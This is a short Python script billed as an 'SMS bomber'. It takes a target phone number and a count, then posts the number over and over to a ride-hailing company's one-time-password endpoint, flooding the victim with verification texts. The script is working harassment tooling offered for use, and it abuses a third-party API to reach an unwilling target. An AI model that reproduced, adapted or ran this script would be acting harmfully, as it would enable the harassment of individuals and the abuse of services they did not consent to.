import requests as req
import time
from colorama import Fore
print(Fore.GREEN+'''
            #################################################
            #################################################
            ##########     SMS bomber              ##########
            ############ CreaTed BY Mobin_dan‌‌ ‌ ‌‌    ##########
            ############  WE LOVE IRAN           ############
            ############ t.me/termux_learning    ############
            #################################################
            #################################################

''')
phone=int(input(Fore.GREEN+"target"+Fore.RED+"=>"))
num =int(input(Fore.GREEN+"send sms"+Fore.RED+"=>"))
print(Fore.GREEN+"Start"+Fore.RED+"..")
url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
data ={"cellphone": phone}
for i in range(0,num):
    req.session()
    time.sleep(3)
    r =req.post(url,data)
    print(Fore.GREEN+"[+]"+Fore.RED+"Sending")
